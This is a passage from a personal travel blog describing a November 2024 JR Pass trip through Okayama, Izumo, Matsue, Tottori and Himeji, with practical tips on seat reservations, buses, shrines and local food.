Okayama Station does.) At Okayama Station, I found the ticket vending machine; use the middle green machine, as it’s the only one that can exchange the JR Pass.Exchange Process:Prepare your passport and the QR code for the purchased JR Pass. You can first select “Traditional Chinese” in the top right corner, then click the yellow button “QRコードの読取り (QR Code Scan)” in the bottom left to exchange. You can choose the start date, and the reserved seat times will also be calculated from the start date. ⚠️_ (I chose to start tomorrow)Just follow the steps to scan the JR Pass QR code and your passport to complete the exchange.JR Pass QR CodeExchange Result:The above image is an example of the JR Pass I exchanged last year.After the exchange, you will receive three tickets; the other two rectangular ones are instructions and are not useful; the one printed with PASS is the most important, as you will need it to enter and exit the station! Keep it safe!Reserving JR Reserved SeatsThis part is very important. According to the information provided on the JR Pass Kansai &amp; San’in Area Pass official website, the JR YAKUMO 八雲 (Yakumo) train to the San’in region has all reserved seats, and there are no non-reserved seats ⚠️⚠️⚠️ (starting March 16, 2024), so reservations must be made in advance. You should also be able to reserve online; I previously reserved a JR train from Hakata to Yufuin online, but you need to check it out. Google Maps transportation information is incomplete; you can find detailed schedules and train names on the JR official website. ⚠️⚠️⚠️JR Pass Reserved Seat Reservation Process: The JR Pass Kansai &amp; San’in Area Pass allows you to use the machine to reserve up to 6 designated seats; if you exceed that, you need to go to the ticket counter to reserve. Each region’s JR Pass has different limits, so please refer to the official website for information. First, check the English names of your departure and destination JR stations, for example: OKAYAMA (岡山) -&gt; MATSUE (松江). Please note that you need the English names of the JR stations, so if you’re going to Fukuoka, you need to type Hakata XD. First, select “Traditional Chinese.” Next, insert one “JR Pass ticket.”(If you are traveling with multiple people and want to reserve seats together, you will be prompted to continue inserting tickets in the fourth step.) Follow the steps in the video below to complete the reservation: The video shows the entire process of reserving a ticket from Yasugi Station to Tottori Station. (There was no one at the ticket vending machine at that station, so I dared to take out my phone to record the whole process)Reservation Completed:Due to the schedule and tomorrow’s itinerary, I reserved the 07:05 train to Matsue to drop off my luggage at the hotel. You will still use the JR Pass (the one above) to enter and exit the station ⚠️⚠️⚠️; the reserved ticket is just to inform you of your carriage and seat number. There were no window seats left, so I had to sit in the aisle QQ.After casually buying a fried beef cutlet bento and some snacks and drinks from the convenience store at Okayama Station, I went to the hotel to rest. Okayama Station is under renovation, and I will return to Okayama on the last day of my trip.It’s a five-minute walk from Momotaro Shopping Street to the hotel.~= 19:00 Back at the Hotel to Eat and RestThe bento was a bit small, but the Okayama white peach in this can of peach wine was delicious! Plus, I enjoyed the nostalgic Japanese convenience store (FamilyMart) hot dogs and fried chicken. I felt very satisfied tonight; goodnight Okayama! Getting ready for an early start tomorrow for my Japan trip.Okayama Korakuen Light-UpThe Okayama Korakuen light-up event for 2024 will take place from November 15 (Friday) to November 24 (Sunday). As of today, the lights have not yet been turned on; if they are, it would be worth checking out as it’s quite beautiful.Photo I took of the Sanyo mail light-up last year, 2023Day 2 (11/13 Wednesday) Shimane — Izumo Taisha, Lake Shinji Sunset07:05 Departing on the Yakumo train to MatsueThe train is quite comfortable, with luggage areas at both ends for easy storage, and the seats have charging ports.The total journey takes about 2 hours and 45 minutes. You can feel the scenery changing as you travel through the mountains; many areas are still shrouded in mist early in the morning, giving a sense of arriving in a hidden paradise. Unfortunately, I didn’t get a window seat, so I could only enjoy the view from afar.09:49 Arrive in MatsueThe weather in Matsue is fantastic ☀️. After arriving at Matsue Station, I headed straight to the hotel I’ll be staying at tonight, the Matsue Urban Hotel, to drop off my luggage.After dropping off my luggage, I returned to Matsue Station around 10:00 to rebook my seat for the 10:48 Yakumo train to Izumo City. I should have booked my seat from Okayama to Matsue and also reserved one from Matsue to Izumo City at the same time, since I wanted to see the sunset in the afternoon. Otherwise, I could have gone straight to Izumo City without wasting time changing trains. Alternatively, you can take the Ichibata Electric Railway Daisha Line to Izumo Taisha, which takes about the same amount of time.I had a bit of time, so I ran to a convenience store and bought two rice balls, coffee, and fried chicken for lunch.Along the way, we passed Lake Shinji, which is so large that I initially thought it was the sea, but it’s actually a lake. If you want to see Lake Shinji directly, you should book a window seat on the D side; I booked an A seat next to the mountain and couldn’t see anything QQ.11:12 Arrive in Izumo CityAfter arriving at Matsue Station, I had to jog a bit to catch the 11:25 Ichibata Electric Railway North Matsue Line to Kawato Station. You can’t use a transportation card to enter the Ichibata Electric Railway; you need to buy a ticket from the automatic vending machine at the entrance (which accepts electronic payments). If you’re unsure how to buy a ticket, just tell the staff you’re going to Izumo Taisha (出雲大社).At Kawato Station, I needed to transfer (just follow everyone to the opposite platform) to the Ichibata Electric Railway Daisha Line heading to Izumo Taisha-mae Station.Arrive at Izumo Taisha around 12:00The approach to the main shrine is serene and beautiful. If you have time, there are many small shops and food stalls to explore. I later learned that the four torii gates in Izumo are also quite famous. One of the large white torii gates can be found by walking in the opposite direction from the station along the approach to the shrine:Source: Shimane Tourism Official Website For more details, you can refer to the Shimane Tourism Official WebsiteWalking up to the entrance of Izumo Taisha, I realized that I arrived during the Kami Matsuri period (from November 11 to November 17, 2024), so there were many Japanese visitors coming to pay their respects. Every year in the lunar month of October (Gregorian November), all eight million gods gather in Izumo for a “divine council” to discuss matters concerning the human world, such as fate and harmony with nature. Thus, this month is referred to as “Kannazuki” (the month when the gods are absent) in most other regions of Japan, where there are usually no festivals. Only in Izumo is it called “Kamiarizuki,” meaning only in the Izumo region are the gods present. The festival includes the welcoming of the gods (Kami-mukae-sai), prayers for good relationships (Enketsu-ō-sai), and the sending off of the gods (Kami-okuri-sai). Izumo Taisha is dedicated to the main deity: Ōkuninushi no Mikoto (大国主命).It was quite a coincidence; I didn’t intentionally choose this time when planning my trip. I only found out while researching the attractions.After passing through the entrance torii gate, you still need to walk about 5 minutes to reach the shrine.Japan’s Largest “Nihonmaru” National FlagOnce inside the shrine, look to the left, and you’ll see a tall flagpole with Japan’s largest Nihonmaru flag (about 75 tatami mats, 137 square meters).Walking towards this flagpole will lead you to the “Kagura-den,” where you can find Japan’s largest shimenawa.Up close, it’s truly massive, especially compared to the regular shimenawa found at other shrines, which is about ten times smaller. (It measures 14 meters in length, weighs 5 tons, and is handmade, being replaced every few years.) Please remember that the largest one is at the “Kagura-den,” don’t make the same mistake I did by thinking it was at the main shrine.After walking around, I noticed it was quite crowded, and some people had to wait in long lines to pay their respects. The way to pay respects at Izumo Taisha is different from other shrines: ⚠️⚠️⚠️ You must bow twice, clap four times, and then bow once more.I bought a limited edition amulet available only during the Kami Matsuri. (Sold only for this week)After paying my respects, I picked up a stamp collection book and stamped the Izumo Taisha commemorative seal.Map of the five shrines to visit during the Kami Matsuri in Izumo.Due to time constraints, I didn’t visit other shrines in Izumo, and without a car, it felt difficult to collect them all.~= 12:45 Walk to Inasa-no-Hama BeachThe bus schedule was too sparse, so I had to walk, which took about 15 minutes. Along the way, I passed the tomb of Izumo no Akagami, and at the end of the path is Inasa-no-Hama. Inasa-no-Hama:Source: Shimane Tourism Official Website A site rich in Japanese mythology, the small island in the picture is called Benten Island, which has a small shrine on it. Recognized as one of Japan’s top 100 beaches, “Sunset Sacred Ground Izumo” is a landmark where the sunset beautifully descends behind Benten Island. It has been registered as a Japanese heritage site and is also the location for the welcoming ceremony for deities from across Japan.Due to limited time, I couldn’t stay for the sunset and just took a quick look before heading back. Later, when I checked Instagram back in Taiwan, I found out that there’s a sand amulet available here:https://www.instagram.com/reel/CynStXPyZAX/I walked back to the Izumo Taisha bus station to catch a bus back to JR Izumo Station.I could see a long line of vehicles waiting to enter the Izumo Taisha parking lot for worship.The Izumo Taisha bus station is located behind the souvenir shop, past the restroom. It’s quite small, and I was initially worried about waiting in the wrong place.At this point, it was around 13:15, and I had to wait for the 13:40 bus back to JR Izumo Station. I was very hungry, so I went to the souvenir shop nearby to grab a quick snack.I bought a few quirky stickers from the souvenir shop.13:40 Take the bus back to JR Izumo Station On the way back to Izumo, I met a Japanese person who borrowed my power bank because his phone had completely died. I took the opportunity to practice my limited Japanese by asking him, “ このバスは JR 出雲市駅へ行きますか” (Does this bus go to JR Izumo Station?). He replied, “ はい” (Yes), and that was about all I understood.)~= 14:15 Arrive back at JR Izumo Station(I rushed to see the sunset at Lake Shinji, which was scheduled for 17:05 that day.)This time, I didn’t take the Yakumo train; instead, I took the 14:54 local train to Yonago, following Google Maps’ suggestion to get off at Nogi Station and walk to the Lake Shinji sunset viewing spot. If you sit on the left (A) side heading towards Matsue, you can see the lake view directly. Unfortunately, I sat on the side next to the mountain again and missed it. At this small station, you have to press a button for the doors to open; it was my first time encountering that. ⚠️~= 15:35 Arrive at Nogi StationNoguchi Station is quite small, with no staff or ticket machines. If you have a JR Pass, you can simply exit the station without worrying about leaving it in the ticket box. ⚠️⚠️⚠️Walking from Noguchi Station was a bit of a miscalculation; the area is quite desolate with not many people around…Fortunately, I found a 7-Eleven along the way where I bought a hot dog, fried chicken, and a drink to enjoy while waiting for the sunset.16:00 Waiting for the sunset at Lake Shinji Lake Shinji is the seventh largest lake in Japan, known for its beautiful sunsets. The small island in the picture is the Yomejima Shrine, which has a white torii gate. I previously mistyped it as Anato Lake.There was a heron.If you walk up, you’ll reach the Shimane Prefectural Art Museum, which is livelier and has a café; however, the view from the steps here is better.16:45 The sun begins to setAt first, I didn’t feel much, but as the sunset approached, I began to appreciate the beauty of the first sunset. The heron also gracefully blended into the scenery.As the sun neared the horizon, it seemed to disappear at a visible speed, with each passing moment bringing it lower.Before I knew it, at 17:01, the sun was no longer visible. It was truly beautiful and soothing.Finally, I took a moment to look around at the Sunset Viewing Steps and the people watching the sunset.After the sunset, I turned around to wait for the bus back to Matsue.Sunset IndexYou can check the sunset index on the Shimane tourism websiteLake Shinji Sightseeing Boathttps://hakuchougo.jp/timetable/There are sightseeing boats on Lake Shinji, which you can take close to sunset to enjoy the view from the water; I would love to try it next time. You can use the San’in-Sanyō Area 3-Day Pass that comes with the JR Pass for free rides, saving you 1,800 yen.18:00 Back at Matsue Station, HotelBuying Souvenirs at the Gift Shop on the First Floor of Matsue StationI thought it would be nice to buy some souvenirs unique to the San’in region here.One unique item is the beef bone soup ramen, as it’s usually pork bone. I bought a box to try back in Taiwan.I also bought two large boxes of cookies (great for sharing with colleagues). The sweet ones are ordinary but are a commemorative item from the Izumo Taisha Shrine, while the savory seafood crackers were delicious!Back to the HotelThis building doesn’t have an elevator; I booked a room in Building 2. You can cross the bridge from the main lobby to Building 2, where the second floor has a lounge, microwave, laundry room, and vending machines. The second building feels a bit less secure; there are no access restrictions for the elevator, and the first and second floors are capsule hotels, which makes it feel a bit complicated. Since it’s a bit far from the main lobby, I blocked the door with my suitcase after checking in, just in case someone suspicious tried to enter.In the lobby, you can grab free face masks, coffee, and tea bags.Finding FoodAfter checking in, I went outside to find something to eat. It was quite cold and dark outside, so I quickly grabbed a bento from a restaurant near the station and picked up some snacks and drinks from a convenience store before heading back to the hotel.The beef tongue bento was delicious, and the peach sparkling wine I bought from the convenience store was also tasty. Good night, Matsue.I also bought almost the same breakfast combo for the next day…This fruit juice with pulp from Family Mart is a must-have every time I come to Japan!Matsue Lake Shinji 24-Hour Live Stream:I stumbled upon this YouTube channel where you can see the weather and scenery of Lake Shinji.Day 3 (Thursday, 11/14) Matsue Horikawa Sightseeing Boat, Matsue Castle, Adachi Museum of ArtIn the morning, I first left my luggage at the hotel and took a bus from Matsue Bus Station to Matsue Castle for the sightseeing boat.Google Maps doesn’t show the platforms, so I had to check on-site. The bus at platform 2 goes to Matsue Castle.I got off in front of the Citizens’ Hall and walked towards Matsue Castle, where I could see the “Horikawa Sightseeing Boat” boarding area near the parking lot.Using the JR Pass San’in-Sanyō Area 3-Day Pass for Free Rides on the Horikawa Sightseeing Boat Download the Discover Another Japan App Copy the serial number from the confirmation email Open the app, select “Input,” paste the serial number, and press “Activate”Switch to “Use,” fill out the health questionnaire, and after completing it, a QR code camera will appear. Scan the QR code provided by the vendor to show the results, and you’ll have completed the exchange.You can also click “Target Content” to see what can be redeemed. The actual time counted starts from the first redemption of the target, not from when you input the serial number for activation (I activated mine on 11/13).Here are some popular locations where you can use it: Lake Shinji Sightseeing Boat, regular price 1,800 yen Matsue Castle Boat, regular price 1,600 yen Adachi Museum of Art, regular price 2,300 yen Matsue Castle, regular price 680 yen Tottori Sand Dunes Museum, regular price 800 yen Tsutenkaku Tower, regular price 800 yen Okayama Korakuen Garden, regular price 410 yenIt’s really a great deal; just adding up the above can save you 8,390 yen, which is already half the cost of the entire JR Pass.09:15 Boarding the Matsue Sightseeing BoatYou can directly redeem the 3-Day Pass for free rides. This year is warmer, so the heated tables on the boat haven’t been set up yet. There are four bridge points where you need to lower the boat, so be careful not to pinch your hands. The entire ride lasts about 50 minutes. You must take off your shoes before boarding. ⚠️ You can only get a direct view of Matsue Castle from the right side facing the boatman; the further away from the boatman you sit, the closer you are to the bow (i.e., the first row when you enter). ⚠️ As shown in the picture below.We’re boarding now.Perhaps because the maple leaf season hasn’t started yet, there weren’t many people; there were only four of us on the boat, so it felt quite spacious.As we passed under four bridges, we had to lower the boat, so we had to bend down a bit to get through.The gentle breeze while cruising along the river was delightful, and the boatman provided commentary on the surrounding sights and history (though I could only catch the words “hidari” for left and “migi” for right…).https://youtube.com/shorts/KA9xKZV16bkAs we neared the return point, there was a great spot to take photos of Matsue Castle from a distance.The boat ride ended around 10:00.10:15 Matsue CastleAfter returning from the boat ride, I walked back towards the entrance of Matsue Castle, which is just up ahead.Passing by Matsue Shrine, I arrived at Matsue Castle.Due to time constraints, I decided not to go up as I wanted to continue to the Adachi Museum of Art.I returned to the bus stop in front of the Citizens’ Hall to wait for the bus back.~=10:30 Back to the Hotel to Pick Up My LuggageAround 10:30, I returned to Matsue Station to pick up my luggage. While waiting for the traffic light here, I almost got hit by a bicycle with faulty brakes. Luckily, I was standing a bit further back, so I wasn’t hit. It’s important to be cautious when you’re out and about. ⚠️⚠️⚠️After arriving at the station, I went to reserve a seat on the Yakumo 14 bound for An’yama (Adachi Museum of Art).11:03 Heading to An’yamaThe train departed at 11:03, and I bought some snacks near the station to tide me over on the ride. Goodbye, Matsue.The waffles and salted grilled chicken were delicious.11:12 Arrived at Anrai StationWhen you arrive at Anrai Station, don’t rush to exit. Look for the tourist information center where you can store large luggage.(There are lockers outside the station, but they are mostly full.)11:30 Take the shuttle bus to Adachi Museum of ArtFor the latest timetable, please refer to the official websiteAfter storing my luggage, I took the free shuttle bus to the Adachi Museum of Art (queue in order). There weren’t many people in the morning.We arrived at the Adachi Museum of Art after about 20 minutes through the countryside.After getting off, just walk straight ahead to the entrance of the Adachi Museum of Art.I used the 3-Day Pass to exchange for free entry.The first thing to do is to pick up the corresponding “shuttle bus ticket” at the front desk according to your schedule, one ticket per person. Return to the drop-off point at the scheduled time with the ticket to take the bus back to Anrai Station.My plan is to take the JR train departing from Anrai at 14:46 to Tottori, so please note that there aren’t many trains to Tottori⚠️. Very important! Very important! Very important! You must take it, or there’s no guarantee you’ll have a seat on the train.⚠️⚠️⚠️ I was the one who didn’t know to take the ticket. I was originally going to take the 13:00 train, but I found out I needed a ticket and had to go back to get it, so I switched to the 13:35 train back to Anrai. Fortunately, I had plenty of time.Adachi Museum of Art — Japan’s Best GardenYou can sit quietly here and enjoy the beautiful garden scenery.In addition to the garden, the core of the Adachi Museum of Art is its extensive collection of artworks, which are not allowed to be photographed. Follow the designated path to view the artworks and the garden.Outside, you can see part of the garden landscape, which clearly shows that a lot of time and effort has been spent maintaining this scenery.There are two tea rooms inside, offering not only desserts and coffee but also hot meals; it’s worth stopping here to rest, eat something, and enjoy the view. Since I came alone, I didn’t stop to eat anything special.I bought a cardboard reproduction of the collection piece I saw, Yokoyama Taikan’s “Mt. Fuji”, as a souvenir.12:30 Strolling in the nearby shopping streetThere’s a small shopping street outside, and since it was still early, I wandered around. This Shimane Wagyu rice burger was quite bad; it was just a microwaved rice burger that was sticky, and the Wagyu in the middle I bit into was still cold…As mentioned earlier, I initially didn’t know to take the ticket and foolishly waited for the bus. When I realized I couldn’t board at 13:00, I went to get the 13:35 ticket.After getting the ticket, I re-entered (you can re-enter) and sat in the indoor viewing area to relax and enjoy the scenery while waiting for the bus.13:55 Back at Anrai StationOn the way back to Anrai Station, I saw some bright red maple leaves.At this time, there were actually more people heading to the Adachi Museum of Art.This station wasn’t crowded, and since it was still early, I took the opportunity to record a video demonstrating how to use the JR Pass to reserve a seat.Shimane CatI wandered around the tourist information center to kill time.The Seiryu Temple in Anrai also feels like a hidden gem for viewing maple leaves.14:46 Take the limited express train to TottoriThe train model is quite old, with only two carriages (one for free seating and one for reserved seating). My 26-inch suitcase couldn’t fit in the overhead luggage rack (the newer JR trains can accommodate it, but this model is too small). I forgot that I could walk to the last row and place it behind the last row of seats, so I had to cram it into my own seat.Fortunately, there was no one next to me the whole way. The free seating carriage looked more crowded, while the reserved seating area was only about 60% full. Due to my itinerary, I didn’t specifically visit the GeGeGe no Kitaro Station (Sakaiminato Station) or the Detective Conan Station (Yura Station).SourceSource For those interested, you can plan to visit more.15:58 Arrived at JR Tottori StationI headed to tonight’s hotel, Toyoko Inn Tottori Station South Exit. There’s another Toyoko Inn at the North Exit, but I couldn’t book it. The North Exit area is livelier with shopping streets.17:00 Wandering around TottoriWith an hour until dinner, I decided to check out the nearby AEON.Around 18:00, I walked to the Tottori North Exit shopping street to find something to eat. After eating randomly for the past few days, I wanted to find a decent restaurant today.I found a well-rated Tottori Wagyu restaurant on the main street — “Niku Ryori Nick” to try Tottori Wagyu. I was the only customer, probably because it was a weekday. Although Tottori Wagyu isn’t as famous as Kobe or Omi beef, Tottori is the birthplace of Japanese Wagyu culture.I ordered the “Tottori Wagyu Hitsumabushi,” which features Tottori Wagyu served three ways for 3,500 yen, significantly cheaper than Kobe beef.The Tottori Wagyu was tender, but it lacked a strong beef flavor. The first way to eat it was just the Wagyu, which didn’t have much taste.The second and third ways, combined with the accompanying soup, turned it into a delicious chazuke (tea over rice).18:30 Full and heading back to the station and hotelOn the way, I stopped to book my train ticket for the next day to Himeji.I also bought some late-night snacks to enjoy back at the hotel. I got a Y1000 Yakult, but I actually didn’t drink much and slept well… Goodnight, Tottori.Day 4 (11/15 Friday) Hakuto Shrine, Tottori Sand Dunes, HimejiIn the morning, I first visited Hakuto Shrine (for relationships) to pay my respects, then returned to the North Exit of Tottori Station and walked towards the bus terminal, passing through the bus hall to platform 4 to wait for the bus.According to Google Maps, I took the Hakuto Coast Line bus No. 41 to Hakuto Shrine. Buses in Tottori do not accept electronic payments; cash only. Buses in Tottori do not accept electronic payments; cash only. Buses in Tottori do not accept electronic payments; cash only. Please prepare small change in advance or exchange large bills for coins with the driver.⚠️⚠️⚠️ The fare is about 610 yen.Alternatively, you can buy a one-day sightseeing transportation ticket at Tottori Station, which is more economical.Before getting off, pay the fare according to the amount displayed on the screen. Since we boarded without a ticket at the terminal, we paid the fare shown for the first stop.~= 09:30 Arrived at Hakuto ShrineAfter getting off, walk towards the pedestrian bridge, and you’ll find the entrance to Hakuto Shrine. Hakuto Shrine is based on the legend of “The White Rabbit of Inaba.” In the legend, the deity Okuninushi (from Izumo Taisha) helps the injured rabbit recover, receiving the rabbit’s blessing and successfully winning the love of Princess Yashiro. Hakuto Shrine symbolizes good relationships and healing, and both shrines carry the sacred meaning of praying for happiness and connections.The shrine isn’t far to walk, but there are many rabbit statues along the way, all piled with relationship stones.Here’s the translation of the text into naturalistic English while keeping the original markdown image sources:There are many Inaba White Rabbit statues at Izumo Taisha, but I forgot to take pictures of them.The torii gate is also piled high with love stones.The shrine itself isn’t very large; you can complete your visit in about 15-20 minutes.I also spent 500 yen to buy a love stone to place by the statue.The Inaba White Rabbits I bought: Left: Bought at a gift shop outside Izumo Taisha Right: Bought at the White Rabbit Shrine (comes with a fortune slip)The story of the Inaba White Rabbit and Okuninushi.~= 09:50 Exterior of the White Rabbit Shrine Tourist Information Center, White Rabbit BeachInside the tourist information center, there is actually a white rabbit, and they sell some snacks and souvenirs. I bought a bread to fill my stomach.White Rabbit Beach is quite desolate.The bus to Tottori Station doesn’t come until 10:45, so I think it would be better to come earlier to catch an earlier bus and save time.from: Sheng Wei Remember to take a numbered ticket when you get on the bus. The number corresponds to the fare, which you should pay along with the ticket when you get off. ⚠️On the bus, I met a tourist from Fujian, China; his itinerary was the opposite of mine—he was going to Himeji first and then to Shimane. We exchanged recommendations for attractions, and he suggested that I visit Shoshazan Engyoji first and then take photos at Himeji Castle from the spots shown in the pictures. Thanks to him! I found it very worthwhile in the end.I got off at Aioi Town and transferred to the bus heading towards Tottori Sand Dunes.This bus requires you to get off at the East Entrance of the dunes. I got ticket number 3 when I got on, and when I got off, I checked the screen for the fare corresponding to number 3, which in this case was 250 yen.My confusing sightseeing route.After getting off, I turned back and followed the signs up past the Tottori Sand Dunes Art Museum to reach the entrance of the dunes. Prohibited activities at Tottori Sand Dunes, especially painting on the sand and damaging nature. ⚠️The Tottori Sand Dunes are truly vast. At this time, the weather wasn’t great and it was a bit rainy, but on a sunny day, it would probably be very hot.~=12:00 Arrived at Tottori Sand DunesJapan’s largest sand dunes.People look so small here. I walked all the way to the ridge of the dunes, which was a bit shaky and the sand was loose, making it hard to walk.At the highest point, you can overlook the entire coastline. This view of the dunes facing the sea is unique to this spot.I checked online and it seems you can ride camels, but today it looked like they weren’t available due to the bad weather.As I left the Tottori Sand Dunes, I took one last look back; they are truly massive. I inevitably got some sand in my shoes, and I saw some people wearing plastic shoe covers, which was very clever.You can take a cable car directly to the Tottori Sand Dunes Observatory, but I thought I’d first go down to try the famous Tottori Sand Dunes pudding, so I didn’t take it. Later, I walked up and it wasn’t far (about 15 minutes).As I came out from the parking lot, I could see the Tottori Sand Dunes “Takahama Cafe,” designed by Kengo Kuma, across the way.I bought one to try, and it was really good—the pudding had a rich milk flavor and a texture like cheese.The special feature is that they give you a small packet of sugar that looks like sand to sprinkle on top.There are also some restaurants along the way where you can eat. Continuing back, there’s a small path; if you go up a little on the right, you’ll find the second entrance to the Sand Dunes Art Museum, and if you go a bit further up on the left, you’ll reach the place where the cable car would take you, the “Tottori Sand Dunes Observatory.”First, I headed left to the Tottori Sand Dunes Observatory to enjoy the view and grab a bite to eat, which would take me to the cable car station.You can first go to the sales area and the adjacent spot to get a brush to clean the sand off your shoes. (The staff at the entrance will remind you too.)Finally, I waited here for the bus back to Tottori.The observatory has souvenir shops on the first and second floors and a small restaurant. You can go up to the third floor to overlook the Tottori Sand Dunes (though there’s not much to see).The food options inside aren’t very many; you need to go to the vending machine next door to buy a meal ticket, then you can enter, find a seat, and hand the ticket to the staff.I casually had an oyster set.I also bought some Tottori souvenirs here.13:30 Sand Dunes Art MuseumAfter eating, I went down from the second entrance to explore the Sand Dunes Art Museum. (Again, I used the 3-Day Pass for free entry.)Starting from the second entrance, you first see the outdoor sand sculptures and then walk down from the third floor to the second. The actual exhibition area only has sand sculptures on the second floor; the venue is small, and if it weren’t free, I probably wouldn’t have gone in.Although the space is small, the details of each sand sculpture are exquisite.There’s also a QR code for the Sand Dunes Art Museum sculpture that you can scan.After walking around, I went back up to the Tottori Sand Dunes Observatory, where I enjoyed a Tottori pear ice cream around 14:20 while waiting for the bus at the stop, which was scheduled for 14:42 towards Tottori Station. When the bus to Tottori arrived, it was already close to full, and I barely squeezed on. If you have time, it might be better to look for a bus from the previous stop.2025/01 UpdateI found out after returning that Tottori offers taxi charter day tours due to the less convenient transportation, for details, please refer to the tourist center or this website.15:10 Back at Tottori StationI arrived back at Tottori Station around 15:10, and it started to rain.I wandered around the shops at the station, and the souvenir store here also sells sand dune pudding!I originally wanted to visit the famous Sunaba Coffee in Tottori, but they had already closed by the afternoon around three. So, I found a place inside the station called Nana’s Green Tea to order some dessert and coffee to recharge (both me and my phone needed charging).The shop was comfortable and not very crowded.I had warabi mochi with ice cream and hot coffee, which was very satisfying.16:15 Back to the hotel to pick up luggage and then back to the station to wait for the trainIt was still early; we were taking the 16:55 Limited Express Super Hakuto to Himeji.While waiting for the train, I saw the Conan train.16:55 Boarding the train to Himeji Goodbye, San’in.I got a seat in the first row of the Green Car, which was very comfortable.Since the train was shaking a lot, I didn’t dare to put my luggage on the overhead rack. Instead, I walked to the last row of seats and placed it horizontally behind the last row.18:27 Arrived at Himeji StationI happened to encounter their local elections, and there were politicians giving speeches outside the station, attracting a large crowd.After exiting the station, I headed straight to the hotel Toyoko Inn Himeji Station Shinkansen North Exit. I would be staying here for the last three nights. The Toyoko Inn near the North Exit is livelier; it looks close on the map, but it actually feels a bit far when walking, taking about 10 minutes.I was assigned a room on the 14th floor, and the view from the window was great.From the window, I could look back at Himeji Station’s railway, and there was a slight sound of trains passing by, but thankfully, there were no trains after the evening.19:00 Out for a stroll in search of foodAs soon as I stepped outside, I was captivated by the beautiful night view of Himeji Castle. I don’t know what got into me, but I wanted to walk to Himeji Castle to take night photos. However, being too close made it hard to capture good shots, so I didn’t take many pictures and just left. I felt cold and hungry; I should have gone straight to eat.Himeji Castle is about 1 kilometer from the station, and it took me nearly 30 minutes to walk back and forth.https://himeji-kyoukasuigetsu.com/en/https://himeji-kyoukasuigetsu.com/en/ Unfortunately, I missed the winter illumination event at Himeji Castle this time. It seemed beautiful and romantic; hopefully, I can come again in the future. The event starts on November 22, 2024 (Friday) and runs until February 23, 2025 (Sunday).In the end, I found that the viewing platform on the second floor of the station’s North Exit was the best spot to photograph Himeji Castle.Before buying dinner, I took a quick stroll through the department store at Himeji Station, Piole Himeji and played some capsule toys.~=20:00 Bought dinner to take backI walked across the second-floor sky bridge to the adjacent TERASSO and found a still-open yakiniku restaurant to take a grilled meat bento back to the hotel.I also stopped by a convenience store to buy some snacks and drinks.After eating and drinking, I took a shower and went downstairs to do some laundry. This time I knew that Toyoko Inn requires you to bring your own detergent, so I bought some laundry powder from the vending machine and put it along with my clothes into the washing machine. The dryer here was very new and high-end, and I could even choose the temperature. Good night, Himeji.Day 5 (11/16 Saturday) Shoshazan Engyoji Temple, Himeji Castle, and Shopping Around HimejiEvery Toyoko Inn provides free breakfast, but I usually just grab some convenience store bread and coffee from the night before to eat on the go to keep on schedule.08:45 Out the doorI left the hotel at 8:45 AM and walked through the deserted shopping street toward the station.08:55 Took the bus to Shoshazan Engyoji TempleHimeji Station has several platforms, and Google Maps didn’t specify which platform or bus number to take, so I had to look for signs on-site. I took the bus from platform 10, bus number 10, heading to Himeji Station North - Shoshazan Ropeway. Shoshazan Engyoji Temple is a filming location for the movie “The Last Samurai”:https://visit-himeji.com/zh-hant/trip-ideas/featured-in-the-last-samurai-shoshazan-engyoji-temple-in-himeji/~=09:20 Arrived at the Shoshazan Ropeway StationAfter getting off, I arrived at the ropeway station. I bought a round-trip ticket from the vending machine and then queued for the ropeway. (It runs every 15 minutes.)From November 15 to 17, there was a special night opening event at Shoshazan, running until 8:00 PM, and the ropeway hours were extended until 8:30 PM.09:30 Took the ropeway up the mountain09:35 Arrived at the entrance of Shoshazan Engyoji TempleI needed to buy an entrance ticket. At that time, I didn’t pay close attention and only bought the general admission fee, which didn’t allow me to take the round-trip transportation and required me to walk up the mountain. ⚠️⚠️⚠️ By car, it takes about 5 minutes. By foot, it takes about 20 minutes (1 KM). If I had the choice again, I would pay an extra 500 yen to save time and energy.Fortunately, it was early in the morning, and I still had plenty of energy. The slope was gentle, so I walked up while enjoying the autumn leaves.After passing through the Nio Gate, there were about 400 meters left.09:55 Arrived at the Mani HallShoshazan Engyoji Temple is quite expansive, and I felt that it would take at least 2 hours to explore everything.I only visited the Mani Hall and the Great Lecture Hall before heading back down.In the Mani Hall, you can take off your shoes to enter and pay your respects, and you can also overlook the autumn leaves from here.It was very serene and quiet, but this year’s autumn leaves were a bit late, with only a few trees turning red.I walked along a small path behind the hall toward the Great Lecture Hall.The Great Lecture Hall features an art installation by Kengo Kuma, which will be exhibited until December 1.The autumn leaves next to the Great Lecture Hall were very vibrant. When I arrived at the Great Lecture Hall, they were just reciting sutras. You can also take off your shoes to enter. The way Japanese monks recite sutras is a bit different from Taiwan; they spread the entire sutra book open and recite it, then close it with a clap at the end.The adjacent dining hall is also open for viewing, showcasing many historical artifacts.All the buildings are historical sites (built in 1282), and walking through them gives a sense of stepping back in time. The overall architecture is well-preserved and maintained.From the second floor of the dining hall, you can see the Great Lecture Hall.After visiting the Great Lecture Hall, I returned to the Mani Hall and bought a freshly baked red bean mochi from the shop outside to replenish my energy. (The freshly baked ones are delicious, with a crispy skin.)Have a safe trip home.After eating, I spent another 20 minutes walking down the mountain back to the entrance of the admission area.~=10:55 Took the ropeway down11:10 Back to Himeji CityWhen I walked back down, I arrived at the bus stop around 11:05 and waited for the 11:10 bus back to Himeji City.~= 11:35 Arrived at Himeji CastleAfter getting off the bus, I walked a bit further to the Himeji Castle boat tour, but since the weather was cloudy and it looked like it might rain, I decided not to go.Entering Himeji Castle, the view of the bridge at the entrance is great for photos!The San-no-Maru Plaza in front of Himeji Castle is quite large, and it takes another 5 minutes to walk to the castle entrance from there.I thought I would first look for the photography spot recommended by a passerby yesterday. The spot is in the opposite direction from the castle entrance, inside the “Himeji City Zoo” on the right.According to the promotion, there are capybaras on the right, but they might not have come out because it was too cold. After entering, I walked straight across the bridge, turned right after seeing the Ferris wheel, and found an open space behind it, which is the photography spot.https://youtube.com/shorts/XDquPOanhpQThis photography spot has a great view, but unfortunately, there are no cherry blossoms or autumn leaves to complement it.After taking some photos, I wandered around the zoo for a bit. The facilities were quite old (the amusement rides required an additional fee), and the animals had small enclosures. Many of them looked quite depressed and exhibited stereotypical behaviors, which was hard to watch. I left after a short visit.After taking pictures of Himeji Castle, I walked back to the left entrance to explore inside the castle.After buying my ticket, I followed the designated route into the castle.Once inside, I had to take off my shoes and was given a plastic bag for them.From the second floor, I looked back at Himeji Station. There were six floors in total, with each level getting smaller and the stairs becoming steeper, requiring a queue to go up. By this time, it was nearly 12:30 PM, and I was starving. I also forgot to bring my power bank 